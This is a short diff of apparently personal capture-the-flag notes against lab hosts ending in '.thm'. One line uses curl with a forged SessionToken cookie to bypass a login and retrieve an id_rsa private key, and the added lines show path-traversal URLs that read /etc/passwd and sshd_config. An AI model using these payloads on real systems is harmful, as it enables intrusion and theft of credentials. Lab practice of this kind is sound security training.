@@ -101,5 +101,12 @@ if (statusOrCookie === "Incorrect credentials") {
 
 What if SessionToken is anything.
 #curl "http://overpass.thm/admin/" --cookie "SessionToken=anything" ( we get id_rsa private key )
+______________________________________________________________________________________________________________________________
+
+http://dev.team.thm/script.php?page=teamshare.php (normal site)
+
+?page= (page parameter has directory traversal vul)
+http://dev.team.thm/script.php?page=../../../../../../etc/passwd
+http://dev.team.thm/script.php?page=/etc/ssh/sshd_config (to get private key)
 
 
